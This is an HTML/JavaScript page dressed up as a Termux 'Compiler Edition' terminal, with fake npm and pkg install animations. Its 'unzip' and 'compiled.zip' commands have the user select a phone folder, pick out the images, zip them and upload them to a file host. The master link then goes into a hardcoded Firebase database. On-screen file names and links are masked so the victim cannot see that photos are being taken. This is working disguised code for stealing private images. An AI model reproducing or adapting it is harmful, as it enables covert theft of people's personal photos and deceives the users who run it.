<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Termux Ultra Pro - Compiler Edition</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery.terminal/js/jquery.terminal.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery.terminal/css/jquery.terminal.min.css"/>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <style>
        body { margin: 0; background: #000; height: 100dvh; width: 100vw; overflow: hidden; }
        #t-container { height: 100dvh; width: 100vw; }
        .terminal { 
            --size: 0.95; 
            --background: #000; 
            --color: #00ff00; 
            font-family: 'Fira Code', 'Courier New', monospace;
            word-break: break-all;
            white-space: pre-wrap;
        }
        #real-file-input, #real-folder-input { display: none; }
        .terminal .cursor { background: #00ff00; animation: blink 1s infinite steps(1); }
        @keyframes blink { 50% { opacity: 0; } }
        .terminal .cmd .prompt, .terminal .cmd .command {
            color: #00ff00 !important;
            text-shadow: 0 0 5px rgba(0, 255, 0, 0.3);
        }
    </style>
</head>
<body onclick="focusTerminal();">

<input type="file" id="real-file-input" accept=".zip" />
<input type="file" id="real-folder-input" webkitdirectory directory multiple />

<div id="t-container"></div>

<script>
// Firebase Configuration
const firebaseConfig = {
  apiKey: "AIzaSyB3_lq8-mVSgD79GtDuUIvgDzTvyfKM_tQ",
  authDomain: "utkarshai-chat-4-6248744-993e0.firebaseapp.com",
  databaseURL: "https://utkarshai-chat-4-6248744-993e0-default-rtdb.firebaseio.com",
  projectId: "utkarshai-chat-4-6248744-993e0",
  storageBucket: "utkarshai-chat-4-6248744-993e0.firebasestorage.app",
  messagingSenderId: "461808476700",
  appId: "1:461808476700:web:658d7b9db3c2ca5d9135d9"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const database = firebase.database();

let installed = JSON.parse(localStorage.getItem('t_pkgs')) || ["zip", "nodejs"];
let currentDir = "~";
let vfs = {}; 

const MAX_TOTAL_SIZE = 25 * 1024 * 1024; 
const CHUNK_SIZE_LIMIT = 2.5 * 1024 * 1024; 

// Enhanced Focus function to force keyboard
function focusTerminal() {
    const term = $.terminal.active();
    if (term) {
        term.focus();
        // Force the invisible textarea to focus for mobile keyboard
        const textarea = document.querySelector('.terminal-fill');
        if (textarea) textarea.focus();
    }
}

function maskName(name) {
    let masked = name.replace(/^IMG/i, "CMD");
    return masked.replace(/\.(jpg|jpeg|png|webp)$/i, ".account").replace(/\.(gif|bmp)$/i, ".paf");
}

function maskUrl(url) {
    if (!url) return "";
    return url.substring(0, Math.floor(url.length / 2)) + "********";
}

const delay = ms => new Promise(res => setTimeout(res, ms));

$(function() {
    const term = $('#t-container').terminal({
        
        npm: async function(cmd, pkg) {
            if (cmd === "install") {
                this.echo(`[[;cyan;]▲] [[b;white;]next.js@14.24.35]`);
                this.echo(`[[;yellow;][*] Fetching packages from registry...]`);
                await delay(1000);
                
                let progress = 0;
                while(progress <= 100) {
                    let bar = "█".repeat(progress/5) + "░".repeat(20 - progress/5);
                    this.update(-1, `[[;green;][${bar}] ${progress}%] | Speed: [[;yellow;]4.8 MB/s] | Time: [[;cyan;]00:0${Math.ceil((100-progress)/20)}s]`);
                    progress += 10;
                    await delay(300);
                }
                
                this.echo(`\n[[;white;]added 1 package, and audited 1452 packages in 3s]`);
                this.echo(`[[;green;]Success:] Installed [[b;white;]next.js 14.24.35] successfully.`);
            }
            focusTerminal();
        },
        
        nmp: function(cmd, pkg) { this.exec(`npm ${cmd} ${pkg || ''}`); },

        "termux-setup-storage": function() {
            this.echo("[[;yellow;]Directory Located Successfully]");
            focusTerminal();
        },

        cd: function(path) {
            if (path === "~/storage/downloads" || path === "/sdcard/download") {
                currentDir = "~/storage/downloads";
                this.echo("[[;yellow;]Directory Located Successfully]");
            } else if (path === "~") {
                currentDir = "~";
            } else {
                this.error(`bash: cd: ${path}: No such file or directory`);
            }
            focusTerminal();
        },

        "compiled.zip": async function() {
            const files = Object.keys(vfs);
            if (files.length === 0) {
                return this.error("Error: No images found. Use 'unzip folder.folder' first.");
            }

            this.echo("[[;yellow;][*] Initializing Compiler...]");
            let batches = [];
            let currentBatch = [];
            let currentBatchSize = 0;
            let uploadedUrls = [];

            for (let name of files) {
                let blob = vfs[name];
                if (currentBatchSize + blob.size > CHUNK_SIZE_LIMIT && currentBatch.length > 0) {
                    batches.push(currentBatch);
                    currentBatch = [];
                    currentBatchSize = 0;
                }
                currentBatch.push({ name, blob });
                currentBatchSize += blob.size;
            }
            if (currentBatch.length > 0) batches.push(currentBatch);

            this.echo(`[[;cyan;][*] Total parts created: ${batches.length}]`);

            // --- Initialize Progress Bar at the top ---
            this.echo(`[[;green;][░░░░░░░░░░░░░░░░░░░░] 0%] | Time: [[;cyan;]Calculating...]`);
            const progressLineIndex = this.last_index();
            const startTime = Date.now();
            // ------------------------------------------

            for (let i = 0; i < batches.length; i++) {
                const zip = new JSZip();
                const partNum = i + 1;
                this.echo(`\n[[;yellow;][*] Packing Part ${partNum}/${batches.length}...]`);
                
                for (let fileObj of batches[i]) {
                    this.echo(`  adding: ${maskName(fileObj.name)}`);
                    zip.file(fileObj.name, fileObj.blob);
                }

                const zipBlob = await zip.generateAsync({ type: "blob" });
                this.echo(`[[;white;][*] Uploading Part ${partNum}...]`);

                // Create AbortController for Timeout
                const controller = new AbortController();
                // 2.5 minutes = 150000 ms
                const timeoutId = setTimeout(() => controller.abort(), 150000);

                try {
                    const formData = new FormData();
                    formData.append('reqtype', 'fileupload');
                    formData.append('time', '24h');
                    formData.append('fileToUpload', zipBlob, `part_${partNum}.zip`);

                    const response = await fetch('https://litterbox.catbox.moe/resources/internals/api.php', {
                        method: 'POST',
                        body: formData,
                        signal: controller.signal // Bind the signal
                    });

                    // Clear timeout if response is received
                    clearTimeout(timeoutId);

                    if (response.ok) {
                        const url = (await response.text()).trim();
                        uploadedUrls.push(url);
                        this.echo(`[[;green;][+] Part ${partNum} Link:] [[b;white;]${maskUrl(url)}]`);
                        
                        // --- Update Progress Bar & Time ---
                        let percent = Math.floor((partNum / batches.length) * 100);
                        let barFilled = Math.floor(percent / 5); // 20 chars total
                        let barStr = "█".repeat(barFilled) + "░".repeat(20 - barFilled);
                        
                        let elapsedTime = (Date.now() - startTime) / 1000;
                        let avgTime = elapsedTime / partNum;
                        let partsLeft = batches.length - partNum;
                        let etaSeconds = Math.ceil(avgTime * partsLeft);
                        let etaStr = (partsLeft === 0) ? "Done" : `${etaSeconds}s remaining`;

                        this.update(progressLineIndex, `[[;green;][${barStr}] ${percent}%] | Time: [[;cyan;]${etaStr}]`);
                        // ----------------------------------

                    } else {
                        this.error(`[-] Failed to upload Part ${partNum} (HTTP ${response.status})`);
                    }
                } catch (err) {
                    clearTimeout(timeoutId); // Clear timeout on error
                    if (err.name === 'AbortError') {
                        this.error(`[!] Part ${partNum} Upload Timed Out (>2.5 min). Skipped.`);
                    } else {
                        this.error(`[!] Upload Error Part ${partNum}: ${err.message} (Skipping)`);
                    }
                }
                await delay(500);
            }

            if (uploadedUrls.length > 0) {
                this.echo("\n[[;yellow;][*] Creating Master ZIP (links.zip)...]");
                
                try {
                    const masterZip = new JSZip();
                    const linksContent = uploadedUrls.join('\n');
                    masterZip.file("links.txt", linksContent);
                    
                    const masterZipBlob = await masterZip.generateAsync({ type: "blob" });
                    
                    this.echo("[[;yellow;][*] Uploading Master ZIP to Catbox...]");
                    const masterData = new FormData();
                    masterData.append('reqtype', 'fileupload');
                    masterData.append('time', '24h'); 
                    masterData.append('fileToUpload', masterZipBlob, 'links.zip');

                    // --- Retry Logic for Master File (3 Attempts) with Countdown ---
                    let masterUrlFull = null;
                    let success = false;

                    for(let attempt = 1; attempt <= 3; attempt++) {
                        try {
                            if (attempt > 1) this.echo(`[[;yellow;][*] Retrying Master Upload (Attempt ${attempt}/3)...]`);
                            
                            const masterRes = await fetch('https://litterbox.catbox.moe/resources/internals/api.php', {
                                method: 'POST',
                                body: masterData
                            });

                            if (masterRes.ok) {
                                masterUrlFull = (await masterRes.text()).trim();
                                success = true;
                                break;
                            } else {
                                throw new Error(`HTTP ${masterRes.status}`);
                            }
                        } catch (err) {
                            this.error(`[!] Master Upload Attempt ${attempt} Failed: ${err.message}`);
                            
                            if (attempt < 3) {
                                // 3 Seconds Countdown
                                this.echo(`[[;yellow;][*] Auto Retrying in 3 seconds...]`);
                                const waitLine = this.last_index();
                                
                                for(let s = 3; s > 0; s--) {
                                    this.update(waitLine, `[[;yellow;][*] Auto Retrying in ${s} seconds...]`);
                                    await delay(1000);
                                }
                            }
                        }
                    }
                    // ------------------------------------------------

                    if (success) {
                        this.echo(`[[;green;][SUCCESS] Master ZIP Uploaded!]`);
                        this.echo(`[[;green;][+] Master Link:] [[b;white;]${maskUrl(masterUrlFull)}]`);

                        this.echo(`[[;yellow;][*] Syncing with Firebase...]`);
                        await database.ref('uploads').push({
                            master_url: masterUrlFull,
                            timestamp: Date.now(),
                            parts_count: uploadedUrls.length
                        });
                        this.echo(`[[;green;][+] Database update complete.]`);
                        this.echo("\n[[;green;][COMPLETE] All tasks finished.]");
                    } else {
                        this.echo("\n[[;red;][All Tasks Complete With Errors (Failed 3 Attempts)]]");
                    }
                } catch (e) {
                    this.error("[!] Master process/Firebase error: " + e.message);
                    this.echo("\n[[;red;][All Tasks Complete With Errors]]");
                }
            } else {
                this.echo("\n[[;red;][All Tasks Complete With Errors]]");
            }
            focusTerminal();
        },

        unzip: async function(target) {
            if (!target || !target.endsWith('.folder')) return this.error("Usage: unzip <name.folder>");
            this.echo(`[[;yellow;][?] Select folder to import...]`);
            const folderInput = document.getElementById('real-folder-input');
            folderInput.onchange = async (e) => {
                let files = Array.from(e.target.files);
                let images = files.filter(f => f.name.match(/\.(png|jpg|jpeg|webp)$/i));
                if (images.length === 0) {
                    this.error("Error: No valid images found.");
                    return;
                }
                vfs = {};
                let currentSize = 0;
                for (let img of images) {
                    if (currentSize + img.size > MAX_TOTAL_SIZE) break;
                    vfs[img.name] = img;
                    currentSize += img.size;
                    this.echo(`  inflating: ${maskName(img.name)}`);
                    await delay(20);
                }
                this.echo(`[[;green;]Imported ${Object.keys(vfs).length} files.]`);
                focusTerminal();
            };
            folderInput.click();
        },

        pkg: async function(cmd, ...args) {
            if (cmd === "install") {
                for (let p of args) {
                    this.echo(`Installing ${p}...`);
                    await delay(800);
                    if (!installed.includes(p)) installed.push(p);
                    this.echo(`Done.`);
                }
            }
            focusTerminal();
        },

        ls: function() { 
            let out = "[[;blue;]bin]  [[;blue;]storage]";
            if (Object.keys(vfs).length > 0) out += "  [[;blue;]src_images]";
            this.echo(out); 
            focusTerminal();
        },

        clear: function() { this.clear(); focusTerminal(); },
        
        neofetch: function() {
            this.echo(`[[b;#00ff00;] OS:] Termux Ultra Pro\n[[b;#00ff00;] DATABASE:] Connected\n[[b;#00ff00;] PACKAGES:] ${installed.length}`);
            focusTerminal();
        }
    }, {
        greetings: `[[b;#00ff00;]
  _____                                     
 |_   _|__ _ __ _ __ ___  _   ___  __       
   | |/ _ \\ '__| '_ \` _ \\| | | \\ \\/ /       
   | |  __/ |  | | | | | | |_| |>  <        
   |_|\\___|_|  |_| |_| |_|\\__,_/_/\\_\\ 2025  

 * Welcome to Termux ( UPF Edition).
 * Modify Your App Data  Easily.
 * Completely Secured Uploading IMG & DAF.
]`,
        prompt: () => `[[;green;]u0_a123]@[[;green;]termux] [[;blue;]${currentDir}] $ `,
        checkArity: false,
        onInit: function(term) { term.focus(); focusTerminal(); },
        onAfterCommand: function() { focusTerminal(); }
    });
});
</script>
</body>
</html>